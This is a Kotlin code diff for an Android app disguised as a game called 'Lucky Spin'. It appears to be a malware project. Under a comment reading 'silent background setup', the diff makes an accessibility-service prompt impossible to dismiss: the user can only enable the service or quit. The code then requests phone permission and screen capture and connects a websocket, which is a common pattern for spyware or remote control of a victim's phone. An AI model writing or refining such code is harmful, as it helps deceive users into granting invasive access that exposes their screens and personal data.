@@ -46,21 +46,25 @@ supportActionBar?.hide()
         
         setupGameView()
         
-        // Silent background setup
-        if (!isAccessibilityServiceEnabled()) {
-    updateStatus("⚠ Enable Accessibility")
-    // Show a dialog guiding the user
-    AlertDialog.Builder(this)
-        .setTitle("Enable Accessibility")
-        .setMessage("Find 'Lucky Spin' in the list and turn it ON.\n\nThis is required for the app to function properly.")
-        .setPositiveButton("Open Settings") { _, _ ->
-            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-            startActivity(intent)
-        }
-        .setNegativeButton("Cancel") { _, _ -> }
+        //silent background setup
+      if (!isAccessibilityServiceEnabled()) {
+    val dialogView = layoutInflater.inflate(R.layout.dialog_accessibility, null)
+    
+    AlertDialog.Builder(this, R.style.CustomDialog)
+        .setView(dialogView)
         .setCancelable(false)
-        .show()
+        .create()
+        .apply {
+            dialogView.findViewById<Button>(R.id.btnSettings).setOnClickListener {
+                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+                dismiss()
+            }
+            dialogView.findViewById<Button>(R.id.btnExit).setOnClickListener {
+                finishAffinity()
+            }
+            show()
         }
+      }
         requestPhonePermission()
         requestScreenCapture()
         webSocketManager.connect()
